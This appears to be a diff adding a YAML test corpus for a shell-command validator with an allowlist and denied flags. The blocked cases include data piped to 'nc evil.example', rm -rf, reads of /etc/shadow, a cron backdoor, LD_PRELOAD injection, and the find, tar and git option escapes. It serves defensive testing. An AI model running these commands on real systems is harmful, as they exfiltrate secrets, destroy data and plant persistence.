@@ -1,0 +1,39 @@
+# Корпус проверочных вызовов для разборщика shell-команд (shlex).
+# Профиль: allow_commands=[ls, cat, grep, git, find, tar],
+# deny_flags={find: [-exec, -execdir, -delete], tar: [--checkpoint-action], git: [-c, --upload-pack]}.
+- {id: SH01, expect: block, args: {cmd: ""}}
+- {id: SH02, expect: block, args: {cmd: "ls; rm -rf /"}}
+- {id: SH03, expect: block, args: {cmd: "ls && cat /etc/passwd"}}
+- {id: SH04, expect: block, args: {cmd: "ls || id"}}
+- {id: SH05, expect: block, args: {cmd: "ls & id"}}
+- {id: SH06, expect: block, args: {cmd: "cat a.txt | nc evil.example 4444"}}
+- {id: SH07, expect: block, args: {cmd: "echo pwn > /etc/cron.d/backdoor"}}
+- {id: SH08, expect: block, args: {cmd: "cat < /etc/shadow"}}
+- {id: SH09, expect: block, args: {cmd: "echo $(id)"}}
+- {id: SH10, expect: block, args: {cmd: "echo `whoami`"}}
+- {id: SH11, expect: block, args: {cmd: "diff <(ls) <(id)"}}
+- {id: SH12, expect: block, args: {cmd: "echo $SECRET_KEY"}}
+- {id: SH13, expect: block, args: {cmd: "echo ${PATH}"}}
+- {id: SH14, expect: block, args: {cmd: "LD_PRELOAD=/tmp/evil.so ls"}}
+- {id: SH15, expect: block, args: {cmd: "/bin/sh -c id"}}
+- {id: SH16, expect: block, args: {cmd: "./evil.sh"}}
+- {id: SH17, expect: block, args: {cmd: "bash -c 'ls'"}}
+- {id: SH18, expect: block, args: {cmd: "python3 -c 'import os'"}}
+- {id: SH19, expect: block, args: {cmd: "curl https://evil.example"}}
+- {id: SH20, expect: block, args: {cmd: "rm -rf /app/data"}}
+- {id: SH21, expect: block, args: {cmd: "find . -exec rm -rf {} ;"}}
+- {id: SH22, expect: block, args: {cmd: "find . -delete"}}
+- {id: SH23, expect: block, args: {cmd: "tar -cf out.tar --checkpoint-action=exec=sh ."}}
+- {id: SH24, expect: block, args: {cmd: "git -c core.sshCommand=evil fetch"}}
+- {id: SH25, expect: block, args: {cmd: "git --upload-pack=evil ls-remote origin"}}
+- {id: SH26, expect: block, args: {cmd: "ls\nid"}}
+- {id: SH27, expect: block, args: {cmd: "ls 'unclosed"}}
+
+- {id: SHB01, expect: allow, args: {cmd: "ls -la"}}
+- {id: SHB02, expect: allow, args: {cmd: "git status"}}
+- {id: SHB03, expect: allow, args: {cmd: "git log --oneline -n 5"}}
+- {id: SHB04, expect: allow, args: {cmd: "grep -rn 'drop; table' src/"}}
+- {id: SHB05, expect: allow, args: {cmd: "grep -F '$LITERAL' notes.txt"}}
+- {id: SHB06, expect: allow, args: {cmd: "cat README.md"}}
+- {id: SHB07, expect: allow, args: {cmd: "find . -name '*.py'"}}
+- {id: SHB08, expect: allow, args: {cmd: "tar -tf archive.tar"}}
